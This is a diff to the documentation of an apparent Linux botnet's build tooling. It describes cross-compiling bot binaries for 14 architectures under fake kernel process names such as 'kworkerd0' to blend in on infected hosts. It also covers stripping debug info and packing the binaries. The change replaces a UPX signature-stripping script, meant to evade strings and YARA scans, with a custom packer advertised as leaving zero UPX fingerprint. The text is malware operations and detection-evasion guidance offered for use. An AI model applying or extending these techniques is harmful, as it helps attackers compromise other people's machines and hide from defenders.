@@ -36,7 +36,7 @@ The `resetconfig` command is useful after a build when you want to restore the s
 
 ### build.sh
 
-Cross-compiles the bot for 14 Linux architectures. Each binary gets a fake kernel process name (e.g., `kworkerd0`, `ethd0`, `ip6addrd`) to blend in on infected hosts. Applies `-trimpath -ldflags="-s -w"` to strip debug info, compresses with UPX, then calls `deUPX.py` to remove UPX signatures.
+Cross-compiles the bot for 14 Linux architectures. Each binary gets a fake kernel process name (e.g., `kworkerd0`, `ethd0`, `ip6addrd`) to blend in on infected hosts. Applies `-trimpath -ldflags="-s -w"` to strip debug info, then compresses with m30w packer (zero UPX fingerprint).
 
 Output goes to `bins/` in the project root.
 
@@ -59,19 +59,6 @@ Output goes to `bins/` in the project root.
 
 ---
 
-### deUPX.py
-
-Strips cosmetic UPX signature strings from compressed binaries so that simple `strings` or YARA scans won't flag them as UPX-packed. Replaces info strings, copyright notices, and URLs with random obfuscation padding.
-
-Does **not** touch structural UPX markers (`UPX!`, `UPX0`, `UPX1`) — those are required by the decompressor stub at runtime.
-
-```
-python3 tools/deUPX.py <file_or_directory>       # Strip UPX signatures in place
-python3 tools/deUPX.py bins/ --dry-run           # Scan only, don't modify
-python3 tools/deUPX.py target.bin -v             # Verbose output
-```
-
-Called automatically by `build.sh` after compilation.
 
 ---
 
@@ -103,6 +90,6 @@ sudo bash tools/fix_botkill.sh
 
 ---
 
-### upx
+### upx (m30w packer)
 
-Bundled UPX binary (Linux amd64). Used by `build.sh` for compressing bot binaries from ~8MB down to ~2.4MB.
+Bundled m30w packer binary (custom UPX fork). Compresses bot binaries from ~8MB down to ~2.4MB with zero UPX fingerprint.
